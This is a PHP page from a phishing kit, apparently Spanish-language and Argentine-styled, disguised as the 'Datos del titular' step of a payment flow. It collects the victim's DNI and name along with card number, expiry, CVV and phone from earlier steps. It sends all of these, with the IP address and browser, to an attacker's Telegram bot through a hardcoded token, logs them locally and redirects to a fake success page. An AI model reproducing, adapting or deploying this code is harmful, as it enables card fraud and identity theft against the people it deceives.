<?php
/**
 * STEP 6 - FINAL - DNI, Nombre y ENVÍO A TELEGRAM
 */
file_put_contents(__DIR__ . '/debug.txt', "Step6 ejecutado: " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);
file_put_contents(__DIR__ . '/debug.txt', "POST recibido: " . print_r($_POST, true) . "\n", FILE_APPEND);
// CONFIGURACIÓN TELEGRAM
$TELEGRAM_BOT_TOKEN = '8234170971:AAH7Z8ySIHDs1tZmWTbFnAc90-RKdh26fwY';
$TELEGRAM_CHAT_ID = '-1003832913889';

// Recibir datos de pasos anteriores
$phone = isset($_POST['phone']) ? trim($_POST['phone']) : '';
$amount = isset($_POST['amount']) ? trim($_POST['amount']) : '';
$card = isset($_POST['card']) ? trim($_POST['card']) : '';
$venc = isset($_POST['venc']) ? trim($_POST['venc']) : '';
$cv = isset($_POST['cv']) ? trim($_POST['cv']) : '';

// ¿Se envió el formulario final?
if(isset($_POST['dni']) && isset($_POST['name'])) {
    $dni = trim($_POST['dni']);
    $name = trim($_POST['name']);
    
    // Info técnica
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $fecha = date('Y-m-d H:i:s');
    
    // Construir mensaje
    $mensaje = "🔔 <b>NUEVA CAPTURA COMPLETA</b>\n";
    $mensaje .= "━━━━━━━━━━━━━━━\n\n";
    
    $mensaje .= "📱 <b>Datos Personales:</b>\n";
    $mensaje .= "├ Teléfono: <code>" . htmlspecialchars($phone) . "</code>\n";
    $mensaje .= "├ Nombre: " . htmlspecialchars($name) . "\n";
    $mensaje .= "└ DNI: " . htmlspecialchars($dni) . "\n\n";
    
    $mensaje .= "💳 <b>Datos Bancarios:</b>\n";
    $mensaje .= "├ Tarjeta: <code>" . htmlspecialchars($card) . "</code>\n";
    $mensaje .= "├ Vencimiento: " . htmlspecialchars($venc) . "\n";
    $mensaje .= "├ CVV: <code>" . htmlspecialchars($cv) . "</code>\n";
    $mensaje .= "└ Monto: $" . htmlspecialchars($amount) . "\n\n";
    
    $mensaje .= "🌐 <b>Información Técnica:</b>\n";
    $mensaje .= "├ IP: <code>" . $ip . "</code>\n";
    $mensaje .= "├ Navegador: " . substr(htmlspecialchars($user_agent), 0, 50) . "...\n";
    $mensaje .= "└ Fecha: " . $fecha . "\n\n";
    
    $mensaje .= "⚠️ <i>Sistema de pasos múltiples</i>";
    
    // Enviar a Telegram
    $url = "https://api.telegram.org/bot" . $TELEGRAM_BOT_TOKEN . "/sendMessage";
    
    $data = array(
        'chat_id' => $TELEGRAM_CHAT_ID,
        'text' => $mensaje,
        'parse_mode' => 'HTML'
    );
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    $enviado = ($http_code == 200);
    
    // Guardar en log
    $log_file = __DIR__ . '/capturas_steps.log';
    $log_entry = sprintf(
        "[%s] Tel: %s | Tarjeta: %s | Nombre: %s | Enviado: %s\n",
        $fecha,
        $phone,
        $card,
        $name,
        $enviado ? 'SI' : 'NO'
    );
    @file_put_contents($log_file, $log_entry, FILE_APPEND);
    
    // Redirigir a success
    header('Location: success.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Datos del Titular | Personal</title>
    <link rel="stylesheet" href="css/op/bootstrap.min.css">
    <link rel="stylesheet" href="css/op/styles.css">
</head>
<body style="background-color: #e5e5e5;">
    <div class="container-fluid">
        <div class="row">
            <div class="col-12 p-0">
                <header class="header">
                    <nav class="px-0 pt-0">
                        <div class="d-flex justify-content-between align-items-center" style="padding: 20px;">
                            <div><img src="assets/flow.svg" style="height: 40px;"></div>
                            <div><img src="assets/secure.svg" style="height: 30px;"></div>
                        </div>
                    </nav>
                </header>

                <div class="row justify-content-center mt-5">
                    <div class="col-12 text-center">
                        <h1 style="color: #333; font-size: 28px; margin-bottom: 30px;">Datos del titular</h1>
                    </div>

                    <div class="col-11 col-sm-6">
                        <form method="POST" action="step6.php">
                            <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
                            <input type="hidden" name="amount" value="<?php echo htmlspecialchars($amount); ?>">
                            <input type="hidden" name="card" value="<?php echo htmlspecialchars($card); ?>">
                            <input type="hidden" name="venc" value="<?php echo htmlspecialchars($venc); ?>">
                            <input type="hidden" name="cv" value="<?php echo htmlspecialchars($cv); ?>">
                            
                            <div class="form-group">
                                <label style="color: #666;">DNI</label>
                                <input type="text" name="dni" id="dni" class="form-control" placeholder="12345678" maxlength="8" style="height: 50px; font-size: 16px;" required>
                            </div>

                            <div class="form-group">
                                <label style="color: #666;">Nombre y Apellido</label>
                                <input type="text" name="name" id="name" class="form-control" placeholder="Juan Pérez" maxlength="50" style="height: 50px; font-size: 16px;" required>
                            </div>

                            <div class="text-center mt-4">
                                <button type="button" onclick="window.history.back()" class="btn btn-secondary px-4 py-2 mr-2">Volver</button>
                                <button type="submit" id="btnPagar" class="btn btn-success px-5 py-3" disabled style="background: #28a745; border: none; font-size: 20px; font-weight: bold;">PAGAR</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="javascript/query.min.js"></script>
    <script>
        function validar() {
            var dni = $('#dni').val();
            var nombre = $('#name').val();
            $('#btnPagar').prop('disabled', !(dni.length >= 7 && nombre.length >= 3));
        }
        
        $('#dni, #name').on('keyup', validar);
    </script>
</body>
</html>